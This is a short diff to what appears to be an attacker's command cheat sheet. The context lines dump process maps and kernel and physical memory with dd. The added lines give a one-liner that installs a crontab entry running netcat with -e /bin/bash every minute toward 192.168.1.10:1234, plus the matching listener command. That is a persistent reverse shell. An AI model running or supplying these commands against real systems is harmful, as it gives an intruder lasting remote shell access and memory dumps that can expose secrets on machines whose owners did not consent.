@@ -20,3 +20,8 @@ cat /proc/[PID]/maps
 #Dump Memory
 dd if=/dev/kmem of=/root/kmem
 dd if=/dev/mem of=/root/mem
+
+#One liner to add persistence on a box via cron
+echo "* * * * * /bin/nc 192.168.1.10 1234 -e /bin/bash" > cron && crontab cron
+# and on 192.168.1.10
+nc -lvp 1234
